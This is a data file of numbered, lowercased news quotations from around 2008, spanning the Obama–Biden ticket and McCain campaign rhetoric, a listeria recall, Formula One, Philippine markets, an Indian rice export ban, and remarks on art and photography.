7541752 with the increased development of cellulosic biofuels we are getting one step closer to gaining energy independence from foreign sources for oil this announcement is also a great boost for georgia as a leader in the development of alternative fuels i thank the doe and the usda for recognizing the tremendous potential of cellulosic biofuels to produce clean and efficient fuel
7541753 i believe we must take significant steps to reduce our dependence on foreign oil and one of the best long term solutions is the investment we are making in the production of cellulosic biofuels
7541754 georgia has 24 million acres of commercial forest and these forests contain tons of cellulosic biomass in the form of wood debris paper pulp and grass fuel this is exceptional news for the university of georgia and for the entire state
7541755 social security is and has always been an important program and many seniors in georgia and across the nation depend on this vital program
7541756 currently nearly 48 million americans are receiving some form of social security benefit we must ensure that this program continues to provide benefits to the working americans that deserve what they have earned today americans have been using this program to aid in their retirement for 73 years many have benefited and it is my goal that many will continue to have access to this program as we in congress work to ensure that it remains solvent i would like to take this opportunity to renew our commitment to making sure this program is around for many years to come

7541769 the president felt it was important to have the vice president consult with allies in the region on our common security interests

7541800 theres no evidence of listeria contamination in our products beyond the production lines originally under investigation
7541801 that would be a relatively small number of products the majority of the products would have been manufactured later in the year
7541802 our primary responsibility and need at this stage has been to remove the recalled products from the market weve provided the list of products and weve been in direct contact and have talked with every single one of the customers and distributors that have received and distributed that product
7541803 the surveillance system picked up a problem that was occurring and allowed us to respond efficiently and effectively to an emerging public health issue

7541805 when theres a loss of life involved it is always tragic it should force us to review our protocols review how we deal with things and see if there are better ways we can do things
7541806 but once we were aware of the situation federal officials acted very quickly
7541807 invented baseketball years before the movie as a game that everyone could play and held games in his driveway it became so popular a small league was created by the fifth season championship game the event was so big that the city shut down the street and two local los angeles tv stations came to report on it
7541808 i still need a few last players to finish out the 8 teams its looking like it will be a 14 game season with each team playing every team twice i am working on the scedule the next few days i need to get available days teams can play from a few people yet im looking to start next week so get ready
7541809 i decided to postpon the league to next year i will have a day and time decided for when games will be played until then we will be playing exhibition games
7541810 since there will really be no winners rankings and rosters are unnecessary

7541825 the great thing about this festival is that the crowds are always mad we love that we feed off that
7541826 for us every show we do is a personal thing the british audience have always been amazing and supportive
7541827 theres so much excitement with the new album and to show what weve got it feels like a new challenge for us
7541828 we are coming to the end of the current national drugs strategy yet there are still just minimal services available for those seeking help there are few dedicated residential beds to stabilise or detoxify drug addicts and alcoholics with absolutely no dedicated residential services in nine counties
7541829 while drug abuse was at one stage primarily confined to cities and large towns the problem is now present to some extent or other in just about every parish in the country
7541830 he picked joe biden because he felt joe biden was the best partner for him joe biden is a guy who obviously is accomplished and knowledgeable hes an independent guy who will tell the president what he needs to know even if he doesnt want to hear it thats what you want in a vice president but mostly i think what attracted senator obama was bidens wisdom and not the kind of wisdom you get in washington d c but the kind of wisdom you get when you overcome adversity tragedy in your life as he has the kind of wisdom you get in the working class communities of scranton pennsylvania and wilmington delaware where hes lived all his life hes never lived a day in washington d c
7541831 of course well he would be at the top of any list right
7541832 i think this choice says a lot about the judgment of senator obama he went through a very methodical pragmatic process he listened to a lot of people he talked to each of these candidates several times and came to what i think was a very good choice he picked somebody who has unparalleled expertise on foreign policy somebody who will help him rebuild the economy put people back to work make our country independent of energy but i think you know senator joe bidens personal story has been tested many many times by personal crises hes somebody that works in washington but doesnt live there and i think that says a lot about him doesnt forget where hes from were comfortable with our pick we had a lot of great choices and we talked to a lot of different people but i think we settled on a great pick and a great partnership to bring about change in this country
7541833 i think senator biden again has unparalleled foreign policy experience and i think if you look at not just what was said yesterday by democrats about this pick but look what was said by republicans senator dick lugar of indiana the chairman of the foreign relations committee senator chuck hagel an unparalleled expert on defense policy senator arlen specter another republican this time from pennsylvania all spoke very highly of the choice of joe biden
7541834 but what about change joe biden has actually been in the halls of congress 10 years longer than john mccain has so this whole message about change doesnt that go out the window
7541835 no because again as i said to you earlier joe biden works in washington but he doesnt live there every night he goes home on an amtrak train where he knows the names of the conductors to his wife and family in delaware
7541836 obviously you can pull up a lot of quotes from august when these two guys were running against each other but if you look at the statements just recently joe biden says barack obama has the judgment the intellect and the spine of steel to lead this country in a different direction
7541837 joe biden talks too much he was known during the john roberts supreme court hearing for asking what many believe to be the single longest question in the history of the senate has obama or has someone on your staff talked to joe about keeping it quiet
7541838 on occasion hes asked long questions i think hed probably plead guilty to that i think that may be something that a lot of them are guilty of but look we didnt hire him for his stunning good looks we hired him for his judgment to lead this country if something happens to barack obama and the judgment and the advice that hell give the next president of the united states and we think weve got a fabulous pick
7541839 i dont think so first of all let me say its an excellent choice its a real sign of the leadership of senator obama that he would choose senator biden recognizing the issues of the day are the economic and personal security of the american people it isnt a question of what senator obama needs hes the full package he has great judgment and knowledge and can draw upon expertise this is what brings balance and brings reinforcement anyone who knows senator biden knows that he is a disrupter this is not your standard washington fare this is a person a senator who goes home every night lucky for him to delaware this is a person who has challenged the status quo and hes even criticized senator obama so its a tribute to senator obama that hes not just choosing a yes man but a person who will speak what he believes
7541840 joe is a friend of mine and i have great respect for him i just think that this is a problem for senator obama more than anything else not for joe biden senator obama has made a choice more out of weakness than strength its quite clear from all of the commentaries all of the things ive heard from democrats in particular the strong choice would have been hillary clinton the obvious choice would have been hillary clinton she had 50 percent of the democratic vote obama has 50 percent of the democratic vote you almost have to go to extraordinary lengths to avoid her as the vice presidential pick of the party and it seems to me that for whatever reason that hasnt been explained a choice was made out of weakness than strength you know dont go with your strongest candidate and then go with a candidate that actually emphasizes all your weaknesses and has been quite vocal about them
7541841 the republicans keep saying that the fact that senator obama had to bring joe biden in underscores his vulnerability that he doesnt have the national security the foreign policy experience to be commander in chief and the fact that biden is there on the ticket right now reaffirms that i wonder if you want to respond
7541842 oh i think it shows to me just the opposite it shows that barack obama is someone who is prepared to bring into his administration talented people from all walks of life that will be able to help him move forward but it will be clear that he will be the president i had the privilege of being with him to visit with president karzai in afghanistan with prime minister maliki in iraq and i saw in both cases a very firm very determined very articulate spokesperson or representative who could deliver a message a tough message in both cases he was urging our allies to do much more and they should do much more and i think hes type of person through his intellect and his temperament that can bring in strong forceful and experienced people but be clearly the leader clearly the president clearly the one who will mark the course for this country going forward
7541843 joe comes from a state delaware that borders virginia the eastern shore part of virginia and delaware are not only bordering but very very similar and i think theres a lot in common and joe understands that virginias a very military state joes long track record on foreign relations matters strong support for the military but strong support for america being great at the diplomacy area will go over very well in virginia and i think hes a heart guy i mean as he campaigns hes a great retail campaigner who really connects with people on a visceral level and virginians like that and so i think the pick of joe biden will do very well in virginia
7541844 if you look at what joes done as a senator hes done some things that i think will resonate well with virginians and others hes got a solid record of accomplishment and i think theyre a good team personality wise they complement each other well i think youre going to see them really enjoying being out on the trail together
7541845 yes im just using a joe biden line as you remember you know im going to answer a question with a yes look joes got a great track record and baracks got a record of being right on the critical issues i mean weve got judgment weve got experience we fuse them together in one ticket
7541846 i think it was a smart choice because joe biden does have the experience to number one be president
7541847 i think this is a very strong ticket not only for pennsylvania but for the country and historically pennsylvania has always been close so we expect a close race but i think senator obama and senator biden together form a very strong team a strong team that understands the struggles that people are facing in this economy and i think that will be a strong message for the people of pennsylvania
7541848 you know im not going to talk about my conversations with the campaign about this i will say it was really flattering to be mentioned it always seemed like kind of a longshot to me but it was really really nice to be mentioned i think joe biden with the state of the race and the state of the world was a great choice for senator obama
7541849 well you know i told you my wife said after i found out remember youve been elected to the highest office in the land youre my husband and so you know that was good that put it in perspective so i know who hail to the chief is too
7541850 lets talk a little bit about what it felt like when you got that call on friday from senator barack obama and he informed you that you would not be his vice presidential running mate walk us through a little bit because its one of those experiences that very few people ever have and youve had it
7541851 well obviously its a life changing moment he had a lot of nice things to say about me which i was very flattered by i told him i was honored to be considered i hope it reflected well upon both me and my state and i believed in him and i wanted to do whatever i could to help us change the direction of this country to address the problems that middle class families in states like mine are facing and i thought joe biden was an excellent man and he could count on me to be helpful in any way that i could
7541852 no he just said that they were going to be going in a different direction but he said that that was a reflection on other things than me he said a number of things that would sound immodest if i recounted to you so im not going to do that but look i really got to know barack well during this process and ive got a lot of confidence in his judgment and his ability to lead this country in a better direction and i wholeheartedly support his decision and as i said it was an honor to be in that final two or three you know i dont think youd be there unless they concluded you had a lot of positive things to offer and probably not too many negatives i called joe biden yesterday morning by the way early in the morning to congratulate him i think hes going to be great and lets go out and lead this country in a better direction
7541853 well if my memory serves not long after the primary process was over barack obama sat down with hillary clinton they had a very long and i think productive meeting remember they meet even before she went out on the trail who knows what they talked about in that meeting even dianne feinstein left the room and left the two of them alone so i think its a little but presumptuous on the part of anybody to say they never discussed this because i do believe that they discussed it very well
7541854 well i think thats going to be the role of the convention is to really be a unifying time for the ticket if you think about the allowance of putting hillary clintons name into play have her name placed on the floor thats really a concession in many respects but its an acknowledgment of her historic campaign and i think it will have a unifying effect
7541855 i think theyre going to be won over not by that but theyre going to be won over by the clintons appearance this week and what they say i just have a feeling this weeks going to be very good and both senator clinton and president clinton are going to say lets do all we can to make change in this nation my anecdotal evidence is just hanging around with the virginians who are strong hillary clinton supporters theyre getting on board
7541856 i dont no i couldnt say that look this is such a personal choice however the obama campaign kind of determines that they need to run the process who they need to look at its got to be something that is just that fit that only the candidate can know so yeah nobody whos not picked is disrespected you know its fine
7541857 im not going to get into the process of how these guys were picked were fortunate to have the support of hillary clinton i think clinton supporters are united in the thing that unites all of the people in this convention we need change we cant have more of the same
7541858 very few people know actually what transpired during this process but i can tell you the first person that he sat down and talked to at all about this vice presidential issue was senator clinton they had a discussion back in early june about it and he spent more time with senator clinton alone talking about issues than he has with joe biden or anyone else in the last couple of months so thats simply not true
7541859 look he has a high regard for senator clinton shes going to be an important voice in moving this country forward in the next administration but he felt that senator biden would be the best fit for him at this time for the reasons that i mentioned earlier and i was pleased that senator clinton gave such a robust endorsement to senator biden as the nominee yesterday
7541860 well i think theyd both be good tickets for different reasons both joe biden and hillary clinton are ready to be president of the united states tomorrow theyre both extremely well qualified and experienced hillary clinton obviously has a longer relationship with a broader spectrum of voters women voters who have been following her for a long time but joe bidens going to grow on the american people very fast because hes a tremendously engaging guy a tremendously bright guy and a guy whos sort of harry truman like he tells it like it is
7541861 i think that senator obama chose the vice presidential candidate that brought balance to his ticket its his choice were going into the future
7541862 john mccain has a womans problem and heres his womans problem that he is to the right of george bush when it comes to a womans right to choose he opposes a womans right to choose even in cases of rape and incest he opposed the pay equity act hes so out of touch that he actually doesnt understand that there are cases that women are paid less than men and need judicial remedy john mccain has a womans problem and at the end of the week what youre going to see is a united democratic party senator clinton has made it very clear who her pick is and who her choice is here
7541863 they know that that ad is demonstrably false they know that hillary clinton is supporting barack obama
7541864 on that clip let me tell you this last week the mccain campaign leaked the name of governor romney as a potential running mate and you better clear your whole show next week because you could fill your whole show with the nasty things that john mccain and mitt romney said about each other just a few months ago
7541865 women across this country are going to be introduced to the second real champion for women on the democratic ticket barack has an incredibly strong record and incredibly compelling life story raised by a single mom his grandmother married to this bright and beautiful and talented woman and the father of two young daughters theres no way he is going to forget about womens issues theres no question hillary clinton has served with both these men she chose barack obama this ad is a bit disingenuous i would say suggesting somehow that john mccain would get the support of her or her supporters
7541866 this ad will have a three day life span when hillary clinton speaks on wednesday night she will blow this ad out of the water
7541867 this is a clever effort by mccain to divide democrats at our convention but i assure you were going to leave here stronger and more unified
7541868 i dont blame them for trying but the simple message to the women who voted for hillary clinton is if you like the last eight years under george w bush youre going to love the next four under john mccain lets be honest its the most disastrous presidency that weve had in modern american history john mccain has said theres no significant issue that he disagrees with george w bush on in the end these folks are not going to vote for a continuation of the policies of this administration period and thats what the obama camp needs to spend less time worrying about keeping the clintons out of their campaign and more time worried about how you put bush in the middle of it
7541869 no what i want john to select is the best possible candidate and i think john has a strong record on being pro life 100 percent you couldnt have a candidate thats more committed to appointing judges like roberts like scalia these are judges that biden voted against those are the things that are going to bring conservatives around and of course hes going to select a conservative john is a conservative he always has been
7541870 i have not been as far as i can tell in the case of hillary clinton they thought that she didnt need to be vetted because it had been you know exposed so much various things about her life have been exposed so much in my case i think the same thing is true although im not a candidate for vice president but you can pretty much vet me in about 60 minutes by googling me its down to three or four candidates it is not me i think the three or four are terrific i have my own views on them which i will deliver personally but i think john has some really excellent choices
7541871 thats a touchy subject because the solid republican base is necessary for senator mccain to win and theres a lot of concern about having somebody who is pro choice but bear this in mind that john mccain has never been a trumpeter on the issue never been outspoken and senator mccain is for embryonic stem cell research so that senator mccain himself presents a good balance but i dont know what john mccains going to do on a running mate but he has to balance a lot of factors and i think that there are other matters of concern to the suburban philadelphia voters besides the pro choice issue and i think that mccains independence will stand him in very good stead there
7541872 there were a lot of complaints among democrats four years ago that john kerry and his team didnt do enough to lay out the contrast didnt go after president bush enough in their convention how would you lay out what youre going to do this week and should we expect to see a lot of contrast or more emphasis on biography of barack obama
7541873 you were involved in the convention in 1992 that was somewhat similar in the sense that people didnt know bill clinton the republicans were doing what the republicans do and tried to portray him as a sort of silver spoon ivy leaguer when in fact he had a great american story as barack obama does the son of a single mother working his way up and then going back to work in communities that were failed by steel plant closings were going to tell that story but were also going to tell the story about whats happened to the country under the policies that weve seen under the broken politics of washington and were going to talk about how were going to change that and so you know were not going to shy away from making the contrast people are making a choice we need to make clear what that choice is were going to do it in a constructive way but were going to lay it out very very clearly
7541874 absolutely not in fact i think that you should pay attention to where we go down the line
7541875 i dont know what itll be i expect this is going to be a close election from now to the end you know if i set my clock to the polls i would have jumped off a high building a year ago when you were asking me about polls that showed us 30 points behind for the nomination so im not going to concern myself
7541876 i dont see any storm clouds on the horizon i see nothing but clear sky for our convention and for the country because i think people are going to make the right choice so im not worried about the weather on thursday i think its going to be fine
7541877 john mccain has had a pretty rugged life he has not exactly had a life with a silver spoon in his mouth john mccain has experienced more personal adversity than anybody i know certainly anybody in the united states senate and i think he understands tough problems and the way to deal with them i dont think anybody could ever fault john mccain about being able to deal with adversity and going through really a living hell which is a lot more important than how many apartments your wife owns
7541878 i think we have an opportunity with the candidate on the republican side who is totally out of touch with whats happening across american towns and cities people are in foreclosure theyre terrified theyre going to lose their homes or they have already lost them they are afraid they will never buy a home we still dont have any idea how many homes john mccain owns and i dont begrudge him seven 10 whatever the number is but i think its an indication that he has no idea he doesnt support the kind of foreclosure protection that senator obama has put forth he doesnt support stabilizing this market the middle class tax cut hes put forward is three times as big as john mccains over and over and over again he wants to help people restore the american dream john mccain has lived the american dream but he somehow doesnt feel that that should be opened up to all americans
7541879 this convention is about ensuring that john mccain does not get an eighth home he has seven homes thats enough could be 10 well we dont want an 11th home we dont want him in the white house he says he has seven kitchen tables we dont want him to have an eighth kitchen table when john mccain gets up in the morning and leaves his house to lock his door he has to shuffle through a number of keys to figure out which key works in which door in which home hes at at any given time that suggests a significant disconnect between the average american who is experiencing quite a different economy than the one john mccain has been advocating
7541880 wed be counting a lot of homes if you had a mccain romney ticket theres no question about that
7541881 we had a really enlightening moment this week when senator mccain said the economy was fundamentally sound and then later when he was asked how many homes he owned he couldnt come up with a number couldnt keep track of the number of homes he owned and so maybe thats why he thinks that weve made great progress and that we should continue these policies but the american people dont
7541882 they both live in million dollar homes so what is that about people in glass houses shouldnt throw stones youre sort of not in a position to be pointing at other people when you are in that one percent of america in terms of i mean how many people live in one million dollar homes they both do this is not going to be i think a fruitful way of going about it and its not the new politics that senator obama was talking about trying to convince the american people that john mccain is not a regular guy just isnt going to work
7541883 i think another thing that biden brings and we saw it on his speech on behalf of barack obama he will be along with michelle obama a great testifier on behalf of the story of barack obama what hes done in his life and what hell done as president i think hell be extraordinarily effective
7541884 not just a testifier i mean this was the announcement yesterday he went off as if it were convention speech the number of attacks against president bush and senator mccain
7541885 also he kept saying bush mccain bush mccain as if that were the ticket
7541886 but also the positive message you cant go overboard and joe biden part of barack obamas problem is the same problem that bill clinton had he comes in here famous but not well known
7541887 we now have three sitting senators in this race weve never in american history had two sitting senators run against each other this would i would think give some reason for john mccain to pick someone from not on the floor of the senate
7541888 i do unless he changes his mind i think that michigan is the key of the whole election i think john mccain can win this presidency with two combinations the exact electoral votes that george bush won or michigan
7541889 i dont think joe bidens selection does much to assuage the outrage that a lot of hillary backers feel whether that will translate into some disaffection that lasts till election day among hillary voters i think is very much an open question does biden bring anything in terms of reaching out to voters beyond those that obama might otherwise attract on foreign policy perhaps so but on all the other range of issues he is virtually every bit as liberal as obama is this ticket therefore offers not very much to centrists and conservatives and this is after all i think still a center right country
7541890 when news organizations do their big profiles of joe biden will they be digging for dirt will they for example recycle the 1987 plagiarism incident
7541891 its old news itll be down in the story towards the bottom of the story about the neil kinnock stuff and how joe biden went on and on and on at all the hearings for supreme court justices and joe biden running for president twice and what obama emphasized of course was his biography which all of us who covered him already know so you know that can be discounted to a certain degree
7541892 im not sure that joe biden needed to run across the stage yesterday im not sure that was the best look for a 65 year old man but he was enthusiastic
7541893 after adopting david two years ago are you and madonna trying to accept any other offspring from malawi named mercy
7541894 it was eerie but on the other hand when looking at it from stauffenbergs viewpoint and what he did and what these men did it was powerful
7541895 as an actor i think i can say for all of us who were there that we felt fortunate to get those locations and shoot at those places it really changes the performances to do it there at that spot
7541896 these guys are true american patriots they were fighting two wars
7541897 they were fighting the nazis the fascists in europe and fighting the japanese in the pacific and they were fighting jim crow racism prejudice in the united states of america at the same time
7541898 i love the idea of it it applied to where bond was at the end of the last movie
7541899 the one thing he didnt have with the relationship was that quantum of solace
7541900 its rare where you get a piece of material thats politically pertinent like this but also sort of non preachy and engaging entertainment for an audience

7541910 the set decoration is insane and beautiful to think in the first movie we only had a ladder
7541911 everythings bigger from details like the wardrobe because of how big the screen is and the musical numbers are so much bigger
7541912 he believes hes only got a short time to live and that hes come down with this disease so hes kind of convinced hes got to get up the nerve to tell her how he feels before he dies
7541913 i didnt realize until now how much he effected and impacted lives
7541914 he was an inspiration to many sharing his life and love
7541915 he has given me a good example to follow and i couldnt ask for anything more

7541980 received consistently better care across the board including screening diagnosis treatment and follow up
7541981 ideologues like john mccain and george bush hate the fact that the va exists
7541982 they hate the fact that theres a functional example out there of the government providing better care at a lower cost than the private sector
7541983 the problem that the va faces now is that the bush administration failed to hire enough doctors and disability claims adjusters when they chose to go to war with iraq if these doctors had been hired the va would be an example of the government doing good work bush and mccain dont want the public to see that
7541984 if im driving a humvee in iraq and a roadside bomb explodes and i veer off the road and crush my arm and end up losing it and needing a prosthetic is that a combat wound according to sen mccain
7541985 if mccain would work to properly fund va care there would be no issue about a va card
7541986 mccain by wanting to give vets private care is walking away from the va and ignoring the problem
7541987 for every vet who would get a va card that would be one less vet using the va
7541988 would mean in a short period of time a smaller budget fewer locations and the eventual dismantling of the best health care system in the country

7542008 we have a small number of countries worried about non proliferation if we can get over that we are over the hill

7542026 alleviate poverty in a sustainable manner by enabling the poor to increase their income through microcredit and by assisting them in the accumulation of savings
7542027 now this is just cool not obnoxious or trendy but classic and well executed
7542028 swiftly and accurately measures the impact of price changes specifically on the poor
7542029 people who were poor before these price increases may now be on the verge of hunger and malnutrition
7542030 the poor allocate almost 60 of their expenditure on food while the same proportion of total expenditure is spent on non food such as housing among the non poor
7542031 food would have the greatest weight since this is the biggest expenditure of the poor
7542032 this is a 15 4 increase from the 2008 budget and we are looking at a p40 billion deficit
7542033 the budget for 2009 will focus on the presidents sona commitments and how to implement them as soon as possible
7542034 technically the market looks like it is headed for a consolidation with a positive bias it is presently at a very important support level
7542035 delayed response to crude futures sharp 6 a barrel retreat last friday and wall streets jubilant overnight rally might provide some inspiration in local equities trading today
7542036 for now market sentiment is mixed but psychology can be easily swayed this week
7542037 with all the external and local issues on hand we remain cautious on the markets we still have a long way to go before we can really say that we have gone full circle with regard to the us financial crisis
7542038 the threat remains real and the local economy is vulnerable to a global recession
7542039 shelter themselves in cash and continue to use rallies as selling opportunities
7542040 investors are expected to remain standing at bay although any potential upside in the market is assumed to be pushed by positive news overseas
7542041 thin liquidity and the volatility of fuel prices in the international market will still be the constant factors on the markets general sentiment
7542042 we never deviated from the objectives of the peace process but peace must be anchored on justice the rampage of lawless milf moro islamic liberation front groups in mindanao calls for resolute military and police action
7542043 there is no all out war we are doing this to have all out peace in mindanao we ask all sectors to be with us including our brothers in the oic

7542045 the group occupied four layers of defensive position which the government troops cleared with the help of artillery and air support from air force choppers the enemy withdrew and abandoned their position
7542046 the encounters resulted in two soldiers killed in action and another two wounded in action also on the government side
7542047 at first our relief operation was only in north cotabato now it is spread in several provinces of mindanao costing the department of social welfare and development almost p1 million a day since last week when the conflict intensified
7542048 for as long as the facts and figures are complete well act on it our only interest is that the asset backed security will be in accordance with the law on securitization

7542050 i am so glad so happy after such a bad result in hungary and the way it ended there
7542051 everyone did a fantastic job for me and it is a great result for the team
7542052 to take pole to win the race and to clock the fastest lap you cannot ask for more than that after such a bad experience in budapest
7542053 as far as i am concerned i did nothing wrong it is more about adrian sutil than me
7542054 we have great reliability and a great package and no worries about any of that
7542055 i woke up early on saturday morning and had a spasm in my neck
7542056 at one point i did not think i would recover and be able to race but i had injections and i made it
7542057 i felt it during the race and it was tough for me but i dont think i lost any time the team had pedro de la rosa the reserve driver waiting to race and of course he wanted to because he is spanish
7542058 i felt bad from the start of the weekend with low energy fevers every day and the spasms in my neck luckily i have a great doctor and trainer and we got through it
7542059 it came back after a little while but i lost confidence and it affected me
7542060 the company has been issued a cease and desist order from further selling and advertising projects and from collecting amortization payment from buyers until expressly permitted by the hlurb
7542061 we are not preselling we are getting only letters of intent from interested clients
7542062 look its not our policy to keep unhappy players at our club but it should be taken into consideration that we run this club as a business entity and some of these players have signed legal contracts that run up to december and we surely expect our partners to respect the terms of their contractual obligation
7542063 the audience does not like to be fooled around with
7542064 you look at greys anatomys numbers when they came back there was a huge drop off eventually i think we can get them back but these hiccups have got to stop
7542065 last year our scripts were big and we had a lot of scenes and we just figured we couldnt keep up with production under that model
7542066 it was not necessarily a tug of war for the soul of the show but it was how do we get this done in a responsible way
7542067 they were like lets ground the show a little more it cant be a cartoon we cant have the show be weird and not get an audience and we were like we cant have the show be boring and not get the people back we had last year the challenge to me was to make sure the fundamental dna of the show didnt change
7542068 at this point im not sure i see a consensus for how the commission ends up addressing it
7542069 we have a large and established customer base there is no doubt in our minds that microsoft is going after this space very aggressively but we feel very strong and confident
7542070 this is a logical extension of the investment that weve had in the development space for decades
7542071 im thrilled that we have someone back doing the job
7542072 everybody did fine but she was just a little notch above the rest with her public interactions
7542073 i guess im here for the people and its my pleasure
7542074 this is going to be catastrophic for millions of people
7542075 of course its possible to prepare a forecast with any lead time you like whether or nor that forecast has any accuracy or usable skill is another question
7542076 it was my six days of being well it was like a trance it was so wonderful it was so great to be with my daughter again
7542077 you know i lost i lost big time in boston
7542078 in light of mr gerhartsreiters history of deceitful behavior any statements made by him should be viewed with extreme skepticism
7542079 basically the technology is here its just a matter of engineering it for the lowest cost the highest reliability and the longest survivability in a hostile and corrosive environment
7542080 we are in for a long battle as the floods have come in areas which are not prone to it
7542081 if only i could see the results that these people are getting in the testimonials
7542082 the neoconservative movement seemed more certain about spreading democracy around the world
7542083 interventions in other countries must be more subtle better planned and if possible undertaken with the agreement of multilateral institutions
7542084 china and the non aligned movement will be surprised by this new position
7542085 our response should be to welcome them into systems such as the world trade organisation
7542086 i do not support russias expulsion from the g8 that would encourage russian sense of victimhood fuel russian revanchism and allow the russians to position themselves as the champion of reform for those currently outside the g8
7542087 in the old days we used to revere people who went to the olympics
7542088 now we want winners we dont want to be identified as losers or fatalistic
7542089 non basmati rice from india is available in major outlets but recently it has been noticed that these outlets are rationing quantities
7542090 this step indicates that there are not enough stocks of non basmati rice available and due to the continued ban it is becoming more and more difficult to get non basmati rice from india
7542091 whatever stocks available of non basmati rice in the uae would become more dearer
7542092 recently indian customs identified that few consignments of non basmati rice were labelled as basmati and were being exported to uae they seized these consignments
7542093 overall it seems that ban on non basmati rice will continue till next harvest season which is november and the customs authorities will take all the necessary steps to prevent export of non basmati through unauthorised channels
7542094 and its not a new ban its just an extended ban besides when we have new crops coming in by september or october prices will ease
7542095 the identity card that is meant to verify identity and simplify transactions will be compulsory for all emiratis from the beginning of next year
7542096 we have had talks with the abu dhabi traffic department that culminated in a decision making the card mandatory for emiratis to transfer ownership of their cars and do other transactions at the department other departments will follow to link the card to services that will gradually enable the holders to use it as a multi purpose smart card
7542097 they will face problems dealing with all sorts of transactions including banking

7542101 it was agreed that there would be a nonpartisan candidate for presidents office which has been violated
7542102 we therefore feel that these repeated violations have forced us to withdraw our support for the ruling coalition and sit on the opposition benches
7542103 if the judges are not restored we will perhaps be forced to sit in the opposition
7542104 we will not try to bring the government down but of course then we have no choice but to sit in the opposition
7542105 hes truly humbled by the outpouring of support and wouldnt miss it for anything in the world

7542117 they gave her such a shock she had been hoping she would win but i dont think she could believe it when she actually did
7542118 she is definitely excited about it she was really looking forward to going and it was quite emotional for her
7542119 she wrote that different people from all over the world come together at the olympics and she thought that was special

7542149 we are turning the heat up on idol this year and are thrilled to welcome kara to the judges table
7542150 she is a smart sassy lady and one of americas most successful songwriters we know she will bring a new level of energy and excitement to the show
7542151 we had originally intended for american idol to have four judges
7542152 weve seen from our international series that having a fourth judge creates a dynamic that benefits both the contestants and the viewers
7542153 for the past seven seasons paula has had to endure the experience of being the only woman at the judges table shes been as an island of consideration and gentle criticism between randy and simon offering her invaluable expertise as a performer and no 1 artist to the thousands who have competed on american idol with kara by her side paula finally has some back up and now there is going to be a lot more girl power on the show

7542182 its meant to grab your attention and question what it is
7542183 not since the house fell on the wicked witch of the east has a work of architecture proven so damaging as the new art history center at yale

7542191 in the process of trading up and down dramatically last week it has become clear that only one factor really matters right now
7542192 big money investors have turned oil into a proxy for the u s dollar
7542193 we continue to see little chance for oil to be used by russia as a bargaining tool
7542194 oil is the weapon of last resort not of first resort and it would make no sense for russia to limit exports of crude or products to european countries

7542199 the us dollar to my utter astonishment has been strengthening lately when it should be collapsing as befits the currency of the biggest debtor nation in the world and one which has has borrowed so damned much money for so many decades and which now has an economy comprised mainly of shuffling financial assets about growing a huge suffocating labyrinthine system of spend o holic governments supporting an entire parasite class and paying for it all with the aforementioned debt and lots and lots of taxes
7542200 but this could all be ending soon as i noticed that the s amp p500 index went up to 1 298 even as the average earnings per share of the s amp p500 dropped to us 51 83 from 60 39 earnings went down but the stocks went up weird
7542201 and this is a goodly drop in earnings which seems a little goodlier when you remember that 12 months ago the damned s amp p500 index was at 1 445
7542202 the osce mission to bih has voiced readiness to provide financial support to projects to establish operations at a number of locations in our country aimed at destruction of surplus weapons and ammunition
7542203 research has also shown that there are also considerable grey pockets in manufacturing in particular in excise industries alcohol and cigarette production and fuels textiles and transport
7542204 the main challenge for reducing the size and the scope of the grey economy in bulgaria is strengthening the rule of law the enforcement of regulations
7542205 probably the most important test in this respect is the severing of illegitimate links between high ranking government officials and grey businesses i e defeating loops of companies in particular in the excise and public contract heavy industries such as alcohol and cigarette production construction and infrastructure energy etc
7542206 overall informal employment on its own or in combination with other activities appears to be an important livelihood strategy for many households as it helps to supplement income from other sources

7542412 but in norway and in saudi arabia authorities have instead focused on corralling the foreign exchange earned in the sales of energy and investing it outside their borders creating an income stream for future generations

7542415 this looks like a step backward for obama who had a 51 to 44 percent advantage last month

7542418 the buy side learns to survive in the post credit crisis environment
7542419 theres been a general decline in the trust and the faith that the investors have in the rating agencies standard amp poors moodys investor services and fitch
7542420 the onus is on the investor to perform their own credit risk assessment rather than rely on the rating agencies
7542421 institutional investors realize they have to weigh in with their own intelligence and scrutiny of the underlying data to determine the riskiness of the issues so theyre spending money on the data and databases
7542422 theyre calculating their own expected risk adjusted rate of return they expect on these securities based on their analysis of the creditworthiness of the issuers
7542423 its a question of what do you want to spend your money on do you want to spend your money on a room of expensive talent or can you use their data and spend your money more efficiently
7542424 clients consultants prospects are looking at a new paradigm but the fact is that the rating agencies are dead and you have to do all original work

7542429 the camera is an instrument that teaches people how to see without a camera
7542430 photos always seem to exist as sort of stuffy unnecessary antiques that we put in a drawer unless we take them out put them in current dialogue and give them relevance
7542431 what the modern means of reproduction have done is destroy the authority of art and to remove it or rather to remove the images which they reproduce from any preserve for the first time ever images of art have become ephemeral ubiquitous insubstantial available valueless free they surround us the way language surrounds us the art of the past no longer exists as it once did its authority is lost in its place there is a language of images what matters now is who uses that language for what purpose
7542432 p hotographs depend for their meaning on networks of authority the image supplies little in itself what counts is its use and the power to fix a particular interpretation of the events objects or people depicted some people and especially some institutions have much more clout in this processs than others do
7542433 the first question must always be who is using this photograph and to what end
7542434 by contrast almost all writing about photography in our times tends to begin with the alleged nature of the product rather than with its production and use
7542435 review of george lewis a power stronger than itself the aacm and american experimental music
7542436 picturing the public in black amp white working notes inspired by robert westbrooks democratic hope pragmatism amp the politics of truth
7542437 the opinion that art should have nothing to do with politics is itself a political attitude
7542438 can it still be controversial to say that an apparently disengaged poetics may also speak a political language of self enclosed complacency passivity opportunism false neutrality
7542439 those who say that art should not propagate doctrines usually refer to doctrines that are opposed to their own
7542440 hard and fast categories tend to be instruments used by the victors
7542441 my position is that you cannot work towards peace being peaceful if the peace is to be one where everybodys quiet and doesnt open up share whats unspeakable offer unsolicited criticism defend others rights to speak and encourage discourse that peace is worth nothing it reminds me of the kind of peace that was secured in my old country under the communist regime that is the death of democracy that might have consequences as bad as war bloody war and conflict so to prevent the world from bloody conflict we must sustain a certain kind of adversarial life in which we are struggling with our problems in public
7542442 apolitical art and artless politics are the fruit of a divide and conquer strategy that weakens both art and politics ignite each other and need each other
7542443 i am interested in a political art that is to say an art of ambiguity contradiction uncompleted gestures and uncertain endings an art and a politics in which optimism is kept in check and nihilism at bay
7542444 most of all photography is probably an instrument for showing things a device for displaying them
7542445 democracy is a proposal rarely realised about decision making it has little to do with election campaigns
